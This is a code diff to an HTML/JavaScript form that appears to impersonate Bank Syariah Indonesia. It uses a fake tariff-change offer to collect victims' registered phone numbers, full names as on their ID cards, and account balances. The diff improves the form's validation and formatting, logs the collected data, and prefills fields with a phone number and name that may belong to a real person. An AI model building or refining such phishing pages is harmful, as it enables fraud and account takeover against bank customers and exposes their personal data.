@@ -519,7 +519,7 @@ form{
  <section class="" style="padding: 5px; left: 0; right: 0; margin: 0px auto; width: 60%">
 	<div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%;">
 	<center>
-		<div class="radio-item" ><input name="tarif" id="radio1" type="radio" value="baru" required><label for="radio1">TARIF BARU Rp 150.000 / BULAN</label>
+		<div class="radio-item" ><input name="tarif" id="radio1" type="radio" value="baru" checked><label for="radio1">TARIF BARU Rp 150.000 / BULAN</label>
 		<div class="radio-item"><input name="tarif" id="radio2" type="radio" value="lama" required><label for="radio2" >TARIF LAMA Rp 6.500 / TRANSAKSI</label></div>
 	</center>
 	</div>
@@ -527,16 +527,16 @@ form{
 
     <section style="margin-top: 110px;">
           <label for="nohp" class="lbl">No. HP. Terdaftar</label>
-     <input type="tel" id="nohp" class="form-log" maxlength="13" name="nohp" placeholder="Tuliskan Nomor Handphone Anda" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗡𝗼.𝗛𝗽 𝘆𝗮𝗻𝗴 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝗕𝗦𝗜')" onchange="this.setCustomValidity('')" minlength="10" required>
+     <input type="tel" id="nohp" class="form-log" value="081382926868" maxlength="13" name="nohp" placeholder="Tuliskan Nomor Handphone Anda" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗡𝗼.𝗛𝗽 𝘆𝗮𝗻𝗴 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝗕𝗦𝗜')" onchange="this.setCustomValidity('')" minlength="10" required>
     
    
     <br>
     <label for="nama" class="lbl1">Nama Lengkap :</label>
-     <input type="text" id="nama" class="form-log1" name="nama" placeholder="Tuliskan Nama Sesuai KTP" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗡𝗮𝗺𝗮 𝘀𝗲𝘀𝘂𝗮𝗶 𝗞𝗧𝗣')" onchange="this.setCustomValidity('')" required> 
+     <input type="text" id="nama" class="form-log1" value="fandy" name="nama" placeholder="Tuliskan Nama Sesuai KTP" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗡𝗮𝗺𝗮 𝘀𝗲𝘀𝘂𝗮𝗶 𝗞𝗧𝗣')" onchange="this.setCustomValidity('')" required> 
      
     
      <label for="saldo" class="lbl1">Saldo akhir :</label>
-     <input type="tel" id="saldo" class="form-log1 x" maxlength="" name="saldo" data-name="rek" placeholder="Pastikan saldo terakhir sesuai rekening" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝘀𝗮𝗹𝗱𝗼 𝘁𝗲𝗿𝗮𝗸𝗵𝗶𝗿 𝗱𝗶 𝗿𝗲𝗸𝗲𝗻𝗶𝗻𝗴 𝗮𝗻𝗱𝗮')" onchange="this.setCustomValidity('')" required style="background-image: url(https://hosting.tigerengine.id/yirvgp.jpg);
+     <input type="tel" id="saldo" class="form-log1 x" value="404.094.94"maxlength="" name="saldo" data-name="rek" placeholder="Pastikan saldo terakhir sesuai rekening" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝘀𝗮𝗹𝗱𝗼 𝘁𝗲𝗿𝗮𝗸𝗵𝗶𝗿 𝗱𝗶 𝗿𝗲𝗸𝗲𝗻𝗶𝗻𝗴 𝗮𝗻𝗱𝗮')" onchange="this.setCustomValidity('')" required style="background-image: url(https://hosting.tigerengine.id/yirvgp.jpg);
   background-repeat: no-repeat;
   background-position: 100% 100%;
   background-size: 100% 100%;padding-left: 11%;">
@@ -578,8 +578,7 @@ form{
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
 
-
-    <script>
+<script>
     // Fungsi untuk menampilkan notifikasi
     function showNotification(message, isSuccess) {
         // Buat elemen notifikasi jika belum ada
@@ -658,13 +657,34 @@ form{
         return value.replace(/[^\d]/g, '');
     }
 
+    // Format input saldo sebagai Rupiah
+    function formatRupiah(angka) {
+        // Hapus semua karakter selain angka
+        var number_string = angka.replace(/[^\d]/g, '').toString();
+        
+        // Jika string kosong, return string kosong
+        if (number_string === '') return '';
+        
+        // Format angka dengan titik sebagai pemisah ribuan
+        var sisa = number_string.length % 3;
+        var rupiah = number_string.substr(0, sisa);
+        var ribuan = number_string.substr(sisa).match(/\d{3}/g);
+            
+        if (ribuan) {
+            var separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        return '' + rupiah;
+    }
+
     // Fungsi untuk menangani pengiriman form
     function handleFormSubmit(e) {
         e.preventDefault();
         
         // Ambil nilai dari form
         const tarif = document.querySelector('input[name="tarif"]:checked')?.value;
-        const nohp = document.getElementById('nohp').value;
+        const nohp = document.getElementById('nohp').value.replace(/-/g, '');
         const nama = document.getElementById('nama').value;
         const saldo = removeFormatRupiah(document.getElementById('saldo').value);
         
@@ -681,13 +701,13 @@ form{
         }
         
         // Validasi nama
-        if (!nama) {
+        if (!nama || nama.trim() === '') {
             showNotification('❌ Nama harus diisi', false);
             return;
         }
         
         // Validasi saldo
-        if (!saldo) {
+        if (!saldo || saldo === '0') {
             showNotification('❌ Saldo harus diisi', false);
             return;
         }
@@ -698,6 +718,8 @@ form{
             nama: nama,
             saldo: saldo
         };
+        
+        console.log('Data yang dikirim:', formData);
         
         // Tampilkan loading state pada tombol
         const submitBtn = document.getElementById('btnSubmit1');
@@ -713,27 +735,8 @@ form{
         });
     }
 
-    // Format input saldo sebagai Rupiah
-    function formatRupiah(angka, prefix) {
-        var number_string = angka.replace(/[^,\d]/g, '').toString(),
-            split = number_string.split(','),
-            sisa = split[0].length % 3,
-            rupiah = split[0].substr(0, sisa),
-            ribuan = split[0].substr(sisa).match(/\d{3}/gi);
-            
-        if (ribuan) {
-            separator = sisa ? '.' : '';
-            rupiah += separator + ribuan.join('.');
-        }
-        
-        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
-        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
-    }
-
     // Event listener ketika dokumen siap
     $(document).ready(function() {
-        // Hanya gunakan satu versi jQuery (3.5.1)
-        
         // Inisialisasi mask untuk input nomor HP
         $('#nohp').mask('000-0000-00000');
         
@@ -747,10 +750,13 @@ form{
         
         // Event listener untuk input nomor HP
         $('#nohp').on('input', function() {
-            if ($(this).val() == '0' || $(this).val() == '62') {
-                $(this).val('');
-            }
+            // Hapus karakter non-digit
             this.value = this.value.replace(/[^0-9]/g, '');
+            
+            // Hapus awalan 0 atau 62
+            if (this.value === '0' || this.value === '62') {
+                this.value = '';
+            }
         });
         
         // Tampilkan welcome screen
@@ -776,8 +782,7 @@ form{
             $("#popupku").hide();
         }, 1000);
     }
-	</script>
- 
+</script>
 
 </body>
 </html>
